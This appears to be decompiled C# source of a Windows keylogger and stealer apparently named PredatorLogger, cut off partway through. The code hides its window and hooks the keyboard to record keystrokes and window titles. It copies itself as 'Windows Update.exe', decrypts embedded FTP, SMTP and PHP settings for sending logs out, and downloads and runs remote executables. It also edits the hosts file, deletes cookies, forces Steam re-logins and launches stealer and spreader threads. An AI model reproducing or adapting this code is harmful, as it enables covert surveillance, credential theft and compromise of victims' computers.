using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.My;
using Microsoft.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Microsoft;

[DesignerGenerated]
public class Form1 : Form
{
	public struct KBDLLHOOKSTRUCT
	{
		public int vkCode;

		public int scanCode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	public enum virtualKey
	{
		K_Return = 13,
		K_Backspace = 8,
		K_Space = 32,
		K_Tab = 9,
		K_Esc = 27,
		K_Control = 17,
		K_LControl = 162,
		K_RControl = 163,
		K_Delete = 46,
		K_End = 35,
		K_Home = 36,
		K_Insert = 45,
		K_Shift = 16,
		K_LShift = 160,
		K_RShift = 161,
		K_Pause = 19,
		K_PrintScreen = 44,
		K_LWin = 91,
		K_RWin = 92,
		K_Alt = 18,
		K_LAlt = 164,
		K_RAlt = 165,
		K_NumLock = 144,
		K_CapsLock = 20,
		K_Up = 38,
		K_Down = 40,
		K_Right = 39,
		K_Left = 37,
		K_F1 = 112,
		K_F2 = 113,
		K_F3 = 114,
		K_F4 = 115,
		K_F5 = 116,
		K_F6 = 117,
		K_F7 = 118,
		K_F8 = 119,
		K_F9 = 120,
		K_F10 = 121,
		K_F11 = 122,
		K_F12 = 123,
		K_F13 = 124,
		K_F14 = 125,
		K_F15 = 126,
		K_F16 = 127,
		K_F17 = 128,
		K_F18 = 129,
		K_F19 = 130,
		K_F20 = 131,
		K_F21 = 132,
		K_F22 = 133,
		K_F23 = 134,
		K_F24 = 135,
		K_Numpad0 = 96,
		K_Numpad1 = 97,
		K_Numpad2 = 98,
		K_Numpad3 = 99,
		K_Numpad4 = 100,
		K_Numpad5 = 101,
		K_Numpad6 = 102,
		K_Numpad7 = 103,
		K_Numpad8 = 104,
		K_Numpad9 = 105,
		K_Num_Add = 107,
		K_Num_Divide = 111,
		K_Num_Multiply = 106,
		K_Num_Subtract = 109,
		K_Num_Decimal = 110,
		K_0 = 48,
		K_1 = 49,
		K_2 = 50,
		K_3 = 51,
		K_4 = 52,
		K_5 = 53,
		K_6 = 54,
		K_7 = 55,
		K_8 = 56,
		K_9 = 57,
		K_A = 65,
		K_B = 66,
		K_C = 67,
		K_D = 68,
		K_E = 69,
		K_F = 70,
		K_G = 71,
		K_H = 72,
		K_I = 73,
		K_J = 74,
		K_K = 75,
		K_L = 76,
		K_M = 77,
		K_N = 78,
		K_O = 79,
		K_P = 80,
		K_Q = 81,
		K_R = 82,
		K_S = 83,
		K_T = 84,
		K_U = 85,
		K_V = 86,
		K_W = 87,
		K_X = 88,
		K_Y = 89,
		K_Z = 90,
		K_Subtract = 189,
		K_Decimal = 190
	}

	private delegate int KeyboardHookDelegate(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam);

	private IContainer components;

	private string encryptedemailstring;

	private string encryptedpassstring;

	private string encryptedsmtpstring;

	private string portstring;

	private string timerstring;

	private string fakemgrstring;

	private string encryptedftphost;

	private string encryptedftpuser;

	private string encryptedftppass;

	private string encryptedphplink;

	private string useemail;

	private string useftp;

	private string usephp;

	private string delaytime;

	private string clearie;

	private string clearff;

	private string binder;

	private string downloader;

	private string websitevisitor;

	private string websiteblocker;

	private string AdminRights;

	private string notify;

	private string DisableSSL;

	private string fakerror;

	private string startup;

	private string screeny;

	private string clip;

	private string TaskManager;

	private string logger;

	private string stealers;

	private string melt;

	private string reg;

	private string cmd;

	private string misconfig;

	private string spreaders;

	private string steam;

	private int screenynumber;

	private int Minecraftt;

	private int Bitcoinst;

	private string path;

	private string meltLocation;

	private string appname;

	private string CLog;

	[AccessedThroughProperty("CH")]
	private Clipboard _CH;

	private string emailstring;

	private string passstring;

	private string smtpstring;

	private string ftphost;

	private string ftpuser;

	private string ftppass;

	private string phplink;

	private string ExIP;

	private string LHeader;

	private string RHeader;

	private bool Shift;

	private bool Caps;

	private bool UseCaps;

	private bool BackSpace;

	private const int WM_KEYUP = 257;

	private const short WM_KEYDOWN = 256;

	private const int WM_SYSKEYDOWN = 260;

	private const int WM_SYSKEYUP = 261;

	private IntPtr KeyboardHandle;

	private string LastCheckedForegroundTitle;

	private KeyboardHookDelegate callback;

	public string KeyLog;

	private string Holder;

	private byte[] WB;

	private byte[] Mail;

	private string InternalIp;

	private string MyAV;

	private string MyFirewall;

	private byte[] mem;

	private string CleanedPasswordsMAIL;

	private string CleanedPasswordsWB;

	private virtual Clipboard CH
	{
		get
		{
			return _CH;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			Clipboard.ChangedEventHandler value2 = CH_Changed;
			if (_CH != null)
			{
				_CH.Changed -= value2;
			}
			_CH = value;
			if (_CH != null)
			{
				_CH.Changed += value2;
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		encryptedemailstring = "oESOC4DsnpGhjg9E4Rke2l3h3J+2OGti0DXAIrpxlJm7PU8pwpoc4GgFXCrLgWHxOptsRqkGLtYe6XWbdT4+Fw==";
		encryptedpassstring = "mBd0ilzosYbyF0JgPw5AHUCqn8+wC7CxctFwGoA9cSM=";
		encryptedsmtpstring = "vCN1PiLiBNbtWHA6TbH7QsXGuc21JhPDWlw/hV2W9AY=";
		portstring = "465";
		timerstring = "120000";
		fakemgrstring = "The application failed to initialize properly (0xc0000135)";
		encryptedftphost = "XSgRuYQ7DNfSB1qbs99eabrO3RsoS9zzzGCVqOa5PFD6IBfOdoFNAAZFkykth39s";
		encryptedftpuser = "XALiqXQ3NGQ/UpTYp9pS6w0t1yPuO00qX2Jng6KTZeQkGsXGkPZ7tiawcUNV+ENK";
		encryptedftppass = "GHHvyQobQkbg32BMAggcgq/xwLarN0jXH8/E6WanZ3CCB1T7LCwFP8CYPIv2Ej8l";
		encryptedphplink = "o+TXX1f4p+gSbuvb4Z4e9EvdPEKQvcXTEeE28Q81zlYofHgLZ6TEddQtqDC5sL6x/eAO8gPqsr0a/sgPQlsFurtt5//LcRwRH0pZwXRgcU9FUJrhoFevRT78Q2E8Q+IDJXBUQ8grbqzqZ2o4RpVM+g==";
		useemail = "noemail";
		useftp = "yesftp";
		usephp = "nophp";
		delaytime = "0";
		clearie = "dontclearie";
		clearff = "dontclearff";
		binder = "bindfiles";
		downloader = "downloadfiles";
		websitevisitor = "websitevisitor";
		websiteblocker = "websiteblocker";
		AdminRights = "DisableAdminRights";
		notify = "notify";
		DisableSSL = "DisableSSL";
		fakerror = "Disablefakerror";
		startup = "startup";
		screeny = "Disablescreeny";
		clip = "Disableclip";
		TaskManager = "DisableTaskManager";
		logger = "logger";
		stealers = "stealers";
		melt = "melt";
		reg = "reg";
		cmd = "Disablecmd";
		misconfig = "msconfig";
		spreaders = "Disablespreaders";
		steam = "Disablesteam";
		screenynumber = 1;
		Minecraftt = 120000;
		Bitcoinst = 180000;
		path = Path.GetTempPath();
		meltLocation = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows Update.exe";
		appname = Path.GetFileName(Application.get_ExecutablePath());
		CLog = string.Empty;
		CH = new Clipboard();
		LHeader = "----[";
		RHeader = "]----";
		UseCaps = false;
		BackSpace = false;
		KeyboardHandle = (IntPtr)0;
		LastCheckedForegroundTitle = "";
		callback = null;
		mem = Resources.CMemoryExecute;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(10, 10);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int UnhookWindowsHookEx(int hHook);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int idHook, KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

	[DllImport("tapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long lineSetAppSpecific(long hCall, long dwAppSpecific);

	[DllImport("rtm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long MgmGetNextMfeStats(ref IntPtr pimmStart, ref long pdwBufferSize, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pbBuffer, ref long pdwNumEntries);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	public string GetActiveWindowTitle()
	{
		try
		{
			string lpString = new string('\0', 100);
			GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
			return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private object Hooked()
	{
		try
		{
			return KeyboardHandle != (IntPtr)0;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void HookKeyboard()
	{
		try
		{
			callback = KeyboardCallback;
			KeyboardHandle = (IntPtr)SetWindowsHookExA(13, callback, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
			_ = KeyboardHandle != (IntPtr)0;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void UnhookKeyboard()
	{
		try
		{
			if (Conversions.ToBoolean(Hooked()) && UnhookWindowsHookEx((int)KeyboardHandle) != 0)
			{
				KeyboardHandle = (IntPtr)0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public int KeyboardCallback(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam)
	{
		//IL_07fe: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			object activeWindowTitle = GetActiveWindowTitle();
			if (Operators.ConditionalCompareObjectNotEqual(activeWindowTitle, (object)LastCheckedForegroundTitle, false))
			{
				LastCheckedForegroundTitle = Conversions.ToString(activeWindowTitle);
				KeyLog = Conversions.ToString(Operators.ConcatenateObject((object)KeyLog, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("\r\n\r\n" + LHeader), activeWindowTitle), (object)" - "), (object)DateAndTime.get_Now().ToString()), (object)RHeader), (object)"\r\n")));
			}
			string text = "";
			if (wParam == 256 || wParam == 260)
			{
				if (Code >= 0 && (((Computer)MyProject.Computer).get_Keyboard().get_CtrlKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_AltKeyDown() & (lParam.vkCode == 83)))
				{
					return 1;
				}
				checked
				{
					switch (lParam.vkCode)
					{
					case 8:
					{
						if (KeyLog.EndsWith(RHeader + "\r\n") | !BackSpace)
						{
							text = "[BS]";
							break;
						}
						string keyLog = KeyLog;
						KeyLog = KeyLog.Remove(KeyLog.ToString().Length - 1);
						if (KeyLog.EndsWith(RHeader + "\r\n"))
						{
							KeyLog = keyLog;
							text = "[BS]";
						}
						else
						{
							text = "";
						}
						keyLog = "";
						break;
					}
					case 9:
						text = "\t";
						break;
					case 13:
						text = "\r\n";
						break;
					case 20:
						if (UseCaps)
						{
							if (((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
							{
								Caps = false;
							}
							else
							{
								Caps = true;
							}
						}
						else
						{
							text = ((!((Computer)MyProject.Computer).get_Keyboard().get_CapsLock()) ? "[cap]" : "[/cap]");
						}
						break;
					case 27:
						text = " [esc] ";
						break;
					case 32:
						text = " ";
						break;
					case 37:
						text = "[<]";
						break;
					case 38:
						text = "[^]";
						break;
					case 39:
						text = "[>]";
						break;
					case 40:
						text = "[V]";
						break;
					case 46:
						text = " [del] ";
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						if (Shift)
						{
							text = Conversions.ToString(Strings.ChrW(lParam.vkCode));
							switch (text)
							{
							case "1":
								text = "!";
								break;
							case "2":
								text = "@";
								break;
							case "3":
								text = "#";
								break;
							case "4":
								text = "$";
								break;
							case "5":
								text = "%";
								break;
							case "6":
								text = "^";
								break;
							case "7":
								text = "&";
								break;
							case "8":
								text = "*";
								break;
							case "9":
								text = "(";
								break;
							case "0":
								text = ")";
								break;
							}
						}
						else
						{
							text = Conversions.ToString(Strings.ChrW(lParam.vkCode));
						}
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						if (Shift | Caps)
						{
							text = Conversions.ToString(Strings.ChrW(lParam.vkCode + 32));
							text = text.ToUpper();
						}
						else
						{
							text = Conversions.ToString(Strings.ChrW(lParam.vkCode + 32));
						}
						break;
					case 96:
					case 97:
					case 98:
					case 99:
					case 100:
					case 101:
					case 102:
					case 103:
					case 104:
					case 105:
						text = Conversions.ToString(Strings.ChrW(lParam.vkCode));
						if (Operators.CompareString(text, "a", false) == 0)
						{
							text = Conversions.ToString(1);
						}
						if (Operators.CompareString(text, "b", false) == 0)
						{
							text = Conversions.ToString(2);
						}
						if (Operators.CompareString(text, "c", false) == 0)
						{
							text = Conversions.ToString(3);
						}
						if (Operators.CompareString(text, "d", false) == 0)
						{
							text = Conversions.ToString(4);
						}
						if (Operators.CompareString(text, "e", false) == 0)
						{
							text = Conversions.ToString(5);
						}
						if (Operators.CompareString(text, "f", false) == 0)
						{
							text = Conversions.ToString(6);
						}
						if (Operators.CompareString(text, "g", false) == 0)
						{
							text = Conversions.ToString(7);
						}
						if (Operators.CompareString(text, "h", false) == 0)
						{
							text = Conversions.ToString(8);
						}
						if (Operators.CompareString(text, "i", false) == 0)
						{
							text = Conversions.ToString(9);
						}
						if (Operators.CompareString(text, "`", false) == 0)
						{
							text = Conversions.ToString(0);
						}
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text = "[F" + Conversions.ToString(lParam.vkCode - 111) + "]";
						break;
					case 160:
					case 161:
						if (!UseCaps)
						{
							text = " [shift] ";
						}
						else
						{
							Shift = true;
						}
						break;
					case 162:
					case 163:
						text = " [ctrl] ";
						break;
					case 164:
						text = " [alt] ";
						break;
					case 165:
						text = " [ralt] ";
						break;
					default:
						text = Conversions.ToString(lParam.vkCode);
						Interaction.MsgBox((object)text, (MsgBoxStyle)0, (object)null);
						if (Shift)
						{
							if (Operators.CompareString(text, "192", false) == 0)
							{
								text = "~";
							}
							if (Operators.CompareString(text, "219", false) == 0)
							{
								text = "{";
							}
							if (Operators.CompareString(text, "221", false) == 0)
							{
								text = "}";
							}
							if (Operators.CompareString(text, "220", false) == 0)
							{
								text = "|";
							}
							if (Operators.CompareString(text, "222", false) == 0)
							{
								text = "\"";
							}
							if (Operators.CompareString(text, "186", false) == 0)
							{
								text = ":";
							}
							if (Operators.CompareString(text, "188", false) == 0)
							{
								text = "<";
							}
							if (Operators.CompareString(text, "191", false) == 0)
							{
								text = "?";
							}
							if (Operators.CompareString(text, "187", false) == 0)
							{
								text = "+";
							}
						}
						else if (!Shift)
						{
							if (Operators.CompareString(text, "192", false) == 0)
							{
								text = "`";
							}
							if (Operators.CompareString(text, "219", false) == 0)
							{
								text = "[";
							}
							if (Operators.CompareString(text, "221", false) == 0)
							{
								text = "]";
							}
							if (Operators.CompareString(text, "220", false) == 0)
							{
								text = "\\";
							}
							if (Operators.CompareString(text, "222", false) == 0)
							{
								text = "'";
							}
							if (Operators.CompareString(text, "186", false) == 0)
							{
								text = ";";
							}
							if (Operators.CompareString(text, "188", false) == 0)
							{
								text = ",";
							}
							if (Operators.CompareString(text, "191", false) == 0)
							{
								text = "/";
							}
							if (Operators.CompareString(text, "187", false) == 0)
							{
								text = "=";
							}
						}
						if (Operators.CompareString(text, "107", false) == 0)
						{
							text = "+";
						}
						if (Operators.CompareString(text, "107", false) == 0)
						{
							text = "*";
						}
						if (Operators.CompareString(text, "111", false) == 0)
						{
							text = "/";
						}
						if (Operators.CompareString(text, "44", false) == 0)
						{
							text = " [SS] ";
						}
						break;
					case 109:
					case 189:
						text = ((!Shift) ? "-" : "_");
						break;
					case 110:
					case 190:
						text = (Shift ? ">" : ".");
						break;
					}
				}
			}
			else if (wParam == 257 || wParam == 261)
			{
				switch (lParam.vkCode)
				{
				case 160:
				case 161:
					if (!UseCaps)
					{
						text = "[/shift]";
					}
					Shift = false;
					break;
				case 162:
				case 163:
					text = "[/ctrl]";
					break;
				case 164:
					text = "[/lalt]";
					break;
				case 165:
					text = "[/ralt]";
					break;
				}
			}
			KeyLog += text;
			if (Operators.CompareString(text, "", false) != 0)
			{
			}
			return CallNextHookEx((int)KeyboardHandle, Code, wParam, lParam);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			int result = Conversions.ToInteger("");
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void RestartElevated()
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = true;
			processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
			processStartInfo.FileName = Application.get_ExecutablePath();
			processStartInfo.Verb = "runas";
			Process.Start(processStartInfo);
			Application.Exit();
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_09d8: Unknown result type (might be due to invalid IL or missing references)
		Thread.Sleep(Conversions.ToInteger(delaytime));
		if (Operators.CompareString(AdminRights, "DisableAdminRights", false) != 0 && !MyProject.User.IsInRole((BuiltInRole)544))
		{
			RestartElevated();
			Thread.Sleep(3000);
		}
		checked
		{
			try
			{
				if (Operators.CompareString(appname, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe", false) != 0 && Operators.CompareString(melt, "Disablemelt", false) != 0)
				{
					try
					{
						if (Operators.CompareString(Application.get_ExecutablePath(), meltLocation, false) != 0)
						{
							if (File.Exists(Path.GetTempPath() + "SysInfo.txt"))
							{
								File.Delete(Path.GetTempPath() + "SysInfo.txt");
							}
							File.WriteAllText(Path.GetTempPath() + "SysInfo.txt", Application.get_ExecutablePath());
							if (File.Exists(meltLocation))
							{
								File.Delete(meltLocation);
							}
							File.Copy(Application.get_ExecutablePath(), meltLocation);
							Process.Start(meltLocation);
							ProjectData.EndApp();
						}
						else
						{
							Thread.Sleep(500);
							object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Path.GetTempPath() + "SysInfo.txt");
							((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				int id = Process.GetCurrentProcess().Id;
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pid.txt"))
				{
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pid.txt");
				}
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pid.txt", id.ToString());
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pidloc.txt"))
				{
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pidloc.txt");
				}
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\pidloc.txt", Application.get_ExecutablePath());
				emailstring = Decrypt(encryptedemailstring, "PredatorLogger");
				passstring = Decrypt(encryptedpassstring, "PredatorLogger");
				smtpstring = Decrypt(encryptedsmtpstring, "PredatorLogger");
				ftphost = Decrypt(encryptedftphost, "PredatorLogger");
				ftpuser = Decrypt(encryptedftpuser, "PredatorLogger");
				ftppass = Decrypt(encryptedftppass, "PredatorLogger");
				phplink = Decrypt(encryptedphplink, "PredatorLogger");
				if (IsConnectedToInternet())
				{
					try
					{
						InternalIp = GetInternalIP();
						ExIP = GetExternalIP();
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					MyAV = GetAntiVirus();
					MyFirewall = GetFirewall();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				Thread thread = new Thread(FakemsgInstall);
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
				Thread thread2 = new Thread(Foldersinstall);
				thread2.SetApartmentState(ApartmentState.STA);
				thread2.Start();
				Thread thread3 = new Thread(ServerInstall);
				thread3.SetApartmentState(ApartmentState.STA);
				thread3.Start();
				if (Operators.CompareString(stealers, "Disablestealers", false) != 0)
				{
					if (IsConnectedToInternet())
					{
						Thread thread4 = new Thread(StartStealers);
						thread4.Start();
					}
					Thread thread5 = new Thread(Minecraftsub);
					thread5.Start();
				}
				Thread thread6 = new Thread(Disabler);
				thread6.SetApartmentState(ApartmentState.STA);
				thread6.Start();
				if (Operators.CompareString(logger, "Disablelogger", false) != 0)
				{
					LHeader = "[";
					RHeader = "]";
					HookKeyboard();
					UseCaps = true;
					if (Operators.CompareString(useftp, "noftp", false) != 0)
					{
						Thread thread7 = new Thread(SendLogsFTP);
						thread7.SetApartmentState(ApartmentState.STA);
						thread7.Start();
					}
					else if (Operators.CompareString(usephp, "nophp", false) != 0)
					{
						Thread thread8 = new Thread(SendLogsPHP);
						thread8.SetApartmentState(ApartmentState.STA);
						thread8.Start();
					}
					else
					{
						Thread thread9 = new Thread(SendLogs);
						thread9.SetApartmentState(ApartmentState.STA);
						thread9.Start();
					}
				}
				if (Operators.CompareString(clip, "Disableclip", false) != 0)
				{
					CH.Install();
				}
				if (Operators.CompareString(appname, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WindowsUpdate.exe", false) != 0)
				{
					if (Operators.CompareString(binder, "bindfiles", false) != 0)
					{
						int num = 0;
						string[] array = Strings.Split(binder, "BSPLIT2", -1, (CompareMethod)0);
						foreach (string text in array)
						{
							if (string.IsNullOrEmpty(text.Trim()))
							{
								continue;
							}
							try
							{
								num++;
								string[] array2 = Strings.Split(text, "BSPLIT1", -1, (CompareMethod)0);
								byte[] bytes = Convert.FromBase64String(array2[0]);
								string text2 = array2[1];
								if (Operators.CompareString(text2, ".exe", false) == 0)
								{
									File.WriteAllBytes(Path.GetTempPath() + "EBFile_" + Conversions.ToString(num) + text2, bytes);
									Process.Start(Path.GetTempPath() + "EBFile_" + Conversions.ToString(num) + text2);
								}
								else
								{
									File.WriteAllBytes(Path.GetTempPath() + "BFile_" + Conversions.ToString(num) + text2, bytes);
									Process.Start(Path.GetTempPath() + "BFile_" + Conversions.ToString(num) + text2);
								}
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
						}
					}
					if (IsConnectedToInternet() && Operators.CompareString(downloader, "downloadfiles", false) != 0)
					{
						int num2 = 0;
						string[] array3 = Strings.Split(downloader, "||", -1, (CompareMethod)0);
						foreach (string text3 in array3)
						{
							if (!string.IsNullOrEmpty(text3.Trim()))
							{
								try
								{
									num2++;
									((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://" + text3, Path.GetTempPath() + "DFile_" + Conversions.ToString(num2) + ".exe");
									Process.Start("http://" + text3, Path.GetTempPath() + "DFile_" + Conversions.ToString(num2) + ".exe");
								}
								catch (Exception projectError5)
								{
									ProjectData.SetProjectError(projectError5);
									ProjectData.ClearProjectError();
								}
							}
						}
					}
					if (IsConnectedToInternet() && Operators.CompareString(websitevisitor, "websitevisitor", false) != 0)
					{
						string[] array4 = Strings.Split(websitevisitor, "||", -1, (CompareMethod)0);
						foreach (string text4 in array4)
						{
							if (!string.IsNullOrEmpty(text4.Trim()))
							{
								try
								{
									Process.Start("http://" + text4);
								}
								catch (Exception projectError6)
								{
									ProjectData.SetProjectError(projectError6);
									ProjectData.ClearProjectError();
								}
							}
						}
					}
				}
				if (Operators.CompareString(clearie, "dontclearie", false) != 0 && Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Cookies)))
				{
					string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Cookies));
					foreach (string text5 in files)
					{
						try
						{
							File.Delete(text5);
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
					}
				}
				if (Operators.CompareString(clearff, "dontclearff", false) != 0 && Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles"))
				{
					foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles"))
					{
						foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
						{
							if (file.Contains("cookie"))
							{
								try
								{
									File.Delete(file);
								}
								catch (Exception projectError8)
								{
									ProjectData.SetProjectError(projectError8);
									ProjectData.ClearProjectError();
								}
							}
						}
					}
					string[] files2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles");
					foreach (string text6 in files2)
					{
						if (text6.Contains("cookie"))
						{
							try
							{
								File.Delete(text6);
							}
							catch (Exception projectError9)
							{
								ProjectData.SetProjectError(projectError9);
								ProjectData.ClearProjectError();
							}
						}
					}
				}
				if (Operators.CompareString(websiteblocker, "websiteblocker", false) != 0)
				{
					try
					{
						string text7 = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
						string text8 = File.ReadAllText(text7);
						string[] array5 = Strings.Split(websiteblocker, "||", -1, (CompareMethod)0);
						foreach (string text9 in array5)
						{
							if (!text8.Contains(text9))
							{
								File.AppendAllText(text7, Environment.NewLine + "127.0.0.1 " + text9);
							}
						}
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
				}
				if (Operators.CompareString(steam, "Disablesteam", false) != 0)
				{
					ForceSteamLogin();
				}
				if (Operators.CompareString(spreaders, "Disablespreaders", false) != 0)
				{
					Thread thread10 = new Thread(Spread);
					thread10.SetApartmentState(ApartmentState.STA);
					thread10.Start();
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void ForceSteamLogin()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Steam";
			string text2 = text + "\\config";
			string text3 = text2 + "\\SteamAppData.vdf";
			string text4 = text + "\\ClientRegistry.blob";
			Process[] processesByName = Process.GetProcessesByName("steam");
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
			if (File.Exists(text3))
			{
				File.Delete(text3);
			}
			if (File.Exists(text4))
			{
				File.Delete(text4);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private object IsDotNet(byte[] Bytes)
	{
		try
		{
			_ = Assembly.Load(Bytes).EntryPoint;
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public bool IsConnectedToInternet()
	{
